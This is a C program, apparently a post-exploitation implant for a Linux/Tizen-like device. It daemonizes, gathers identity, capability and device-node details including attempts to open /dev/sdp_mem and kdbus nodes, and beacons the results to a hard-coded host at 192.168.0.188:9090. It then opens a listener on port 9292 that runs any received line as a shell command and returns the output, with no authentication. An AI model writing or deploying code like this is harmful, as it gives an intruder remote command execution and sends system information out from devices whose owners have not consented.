#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
static void sendbeacon(const char *tag, const char *data) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return;
    struct sockaddr_in a; a.sin_family = AF_INET; a.sin_port = htons(9090);
    a.sin_addr.s_addr = inet_addr("192.168.0.188");
    if (connect(s, (struct sockaddr*)&a, sizeof a) == 0) {
        char req[8192];
        int n = snprintf(req, sizeof req, "POST /%s HTTP/1.0\r\nContent-Length: %d\r\n\r\n%s", tag, (int)strlen(data), data);
        write(s, req, n);
        usleep(200000);
    }
    close(s);
}
static void shellreport(void) {
    char buf[16384]; size_t n = 0; FILE *f;
    FILE *p = popen("id; uname -a; cat /proc/self/status | grep -E 'Uid|Gid|Cap|context'; ls -la /dev/sdp_mem /dev/kdbus* 2>&1", "r");
    if (p) { n = fread(buf, 1, sizeof buf - 1, p); pclose(p); buf[n] = 0; sendbeacon("tpk-id", buf); }
    int fd1 = open("/dev/sdp_mem", O_RDWR); int fd2 = open("/sys/fs/kdbus/5001-user/bus", O_RDWR); int fd3 = open("/sys/fs/kdbus/control", O_RDWR);
    snprintf(buf, sizeof buf, "sdp_mem=%d kdbus_bus=%d kdbus_ctrl=%d", fd1, fd2, fd3);
    sendbeacon("tpk-dev", buf);
    if (fd1 >= 0) { char v[128]; int r = read(fd1, v, 4); snprintf(buf, sizeof buf, "sdp_mem read=%d", r); sendbeacon("tpk-sdpread", buf); }
}
int main(void) {
    signal(SIGCHLD, SIG_IGN); daemon(0, 0);
    shellreport();
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
    struct sockaddr_in a; a.sin_family = AF_INET; a.sin_port = htons(9292); a.sin_addr.s_addr = INADDR_ANY;
    if (bind(ls, (struct sockaddr*)&a, sizeof a) < 0 || listen(ls, 4) < 0) { sendbeacon("tpk-bindfail", "bind/listen failed"); return 1; }
    sendbeacon("tpk-listen", "9292 up");
    for (;;) {
        int c = accept(ls, 0, 0);
        if (c < 0) continue;
        if (fork() == 0) {
            close(ls);
            char cmd[4096]; ssize_t r = read(c, cmd, sizeof cmd - 1);
            if (r > 0) { cmd[r] = 0; char *nl = strchr(cmd, '\n'); if (nl) *nl = 0;
                FILE *p = popen(cmd, "r"); char buf[65536]; size_t n = 0;
                if (p) { n = fread(buf, 1, sizeof buf, p); pclose(p); }
                write(c, buf, n);
            }
            close(c); _exit(0);
        }
        close(c);
    }
}
